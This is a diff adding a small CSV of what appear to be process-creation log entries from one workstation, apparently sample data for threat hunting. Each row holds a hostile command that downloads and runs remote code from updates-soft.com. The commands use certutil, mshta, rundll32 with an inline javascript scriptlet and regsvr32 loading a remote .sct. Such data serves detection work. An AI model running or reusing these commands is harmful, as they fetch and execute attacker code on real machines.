@@ -1,0 +1,5 @@
+TimeCreated,Computer,User,Image,ParentImage,CommandLine
+2025-08-16T05:15:10+05:30,WS-220,acme\jane.doe,C:\Windows\System32\certutil.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,certutil.exe -urlcache -split -f http://updates-soft.com/payload.bin C:\\ProgramData\\payload.bin
+2025-08-16T05:16:44+05:30,WS-220,acme\jane.doe,C:\Windows\System32\mshta.exe,C:\Windows\System32\cmd.exe,mshta http://updates-soft.com/a.hta
+2025-08-16T05:17:02+05:30,WS-220,acme\jane.doe,C:\Windows\System32\rundll32.exe,C:\Windows\System32\cmd.exe,"rundll32.exe javascript:\\..\\mshtml,RunHTMLApplication ""document.write();GetObject('script:http://updates-soft.com/s.sct')"""
+2025-08-16T05:17:29+05:30,WS-220,acme\jane.doe,C:\Windows\System32\regsvr32.exe,C:\Windows\System32\cmd.exe,regsvr32.exe /s /u /i:http://updates-soft.com/s.sct scrobj.dll
